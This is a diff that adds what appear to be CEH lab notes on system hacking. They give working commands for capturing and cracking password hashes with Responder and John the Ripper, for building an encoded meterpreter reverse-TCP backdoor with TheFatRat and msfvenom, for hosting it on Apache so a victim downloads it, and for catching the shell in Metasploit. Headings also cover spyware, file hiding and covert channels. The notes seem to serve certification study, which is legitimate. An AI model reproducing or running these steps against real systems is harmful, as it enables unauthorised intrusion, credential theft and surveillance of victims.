@@ -1,1 +1,76 @@
+<<<<Gain access to the system>>>
+
+<<Perform active online attack to crack the system’s password using Responder>>
+cd Responder
+chmod +x ./Responder.py
+sudo ./Responder.py -I eth0
+Run->> \\CEH-Tools 
+sudo snap install john-the-ripper
+sudo john /home/ubuntu/Responder/logs/[Log File Name.txt]
+ 
+<<Audit system passwords using L0phtCrack>>
+
+<<Find vulnerabilities on exploit sites>>
+https://www.exploit-db.com/
+
+<<Hack a Windows machines with a malicious Office document using TheFatRat>>
+fatrat
+enter
+choose [06] Create Fud Backdoor 1000% with PwnWinds [Excelent]
+Choose [3] Create exe file with apache + Powershell (FUD 100%) 
+Set LHOST IP, ip ->> Enter.
+For Set LPORT,port ->> Enter
+Please enter the base name for output files option, type payload and press Enter.
+Choose Payload option, choose [ 3 ] windows/meterpreter/reverse_tcp 
+-------------------------------------------------------------------------------------------------
+
+
+<<Perform buffer overflow attack to gain access to a remote system>>
+
+<<<<Perform privilege escalation to gain higher privileges>>>>
+to create payload
+ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=ip -f exe > Desktop/Exploit.exe 
+
+to share payload with target
+Type mkdir /var/www/html/share and press Enter to create a shared folder
+Type chmod -R 755 /var/www/html/share and press Enter
+Type chown -R www-data:www-data /var/www/html/share and press Enter
+ls -la /var/www/html/ | grep share and press Enter.
+
+To copy the Exploit.exe file into the shared folder, type cp /root/Desktop/Exploit.exe /var/www/html/share/ and press Enter.
+
+Type service apache2 start and press Enter to start the Apache server.
+
+type msfconsole in the terminal and press Enter to launch the Metasploit framework.
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set LHOST ip 
+exploit -j -z
+
+install exploit payload into victim machine using browser
+on Terminal 
+Meterpreter
+sessions -i 1 
+getuid 
+
+<<Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities>>
+
+<<Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter>>
+
+--------------------------------------------------------------------------------------------------
+<<<<Maintain remote access and hide malicious activities>>>>
+
+<<User system monitoring and surveillance using Power Spy>>
+
+<<User system monitoring and surveillance using Spytech SpyAgent>>
+
+<<Hide files using NTFS streams>>
+
+<<Hide data using white space steganography>>
+
+<<Image steganography using OpenStego>>
+
+<<Covert channels using Covert_TCP>>
+-------------------------------------------------------------------------------------
+
 
